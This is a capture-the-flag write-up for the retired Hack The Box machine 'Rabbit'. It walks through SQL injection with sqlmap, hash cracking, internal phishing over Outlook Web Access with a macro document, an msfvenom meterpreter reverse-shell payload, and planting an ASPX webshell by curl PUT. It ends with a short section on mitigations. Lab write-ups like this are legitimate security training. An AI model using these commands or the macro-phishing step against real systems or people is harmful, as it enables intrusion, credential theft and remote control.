---
machine: Rabbit
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, sqli, owa, macro, phishing, webshell]
---

# Rabbit — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SQLi in Complain Management System dumps users and hashes. Recovered credentials grant Outlook Web Access and a macro document is sent to a user, yielding a shell. A webshell on the SYSTEM web server completes the escalation.

## Reconnaissance

```bash
nmap -Pn -sCV -p25,80,443,110,143,3389 <IP>
sqlmap --url "http://rabbit.htb/complain.php?id=1" --batch --dump
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# OWA and macro
# Send a .docm document to an internal user
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe
# Webshell
curl -X PUT --data-binary @shell.aspx http://rabbit.htb/uploads/shell.aspx
curl http://rabbit.htb/uploads/shell.aspx?cmd=whoami
```

## Enumeration

- Complaint application with SQLi and user hashes.
- Exposed OWA and internal employee email.
- Web server with a writable directory and SYSTEM process.

## Initial access

SQLi in the complaint application leaks the user table and hashes. Crack the passwords and access OWA; from there send a macro document to an account that opens it, returning a shell.

## Privilege escalation

The shell user enumerates the web server and finds a writable directory. Plant a webshell on a path executed by the server, which runs as SYSTEM, and obtain a privileged shell.

## Evidence

- SQLi dump with users and hashes.
- OWA access and executed macro.
- Webshell on the server and `whoami` as SYSTEM.

## Lessons learned

- Internal applications also leak credentials.
- Email is a credible internal phishing vector.
- A SYSTEM web server turns a write into root.

## Mitigation and detection

- Parameterize queries and protect hashes.
- Block internet macros and filter attachments.
- Run the web server as a low-privilege account.

## References

- [0xdf — Rabbit](https://0xdf.gitlab.io/2022/04/28/htb-rabbit.html)
- [Microsoft — Macros](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office)
- [Hack The Box — Rabbit](https://app.hackthebox.com/machines/rabbit)
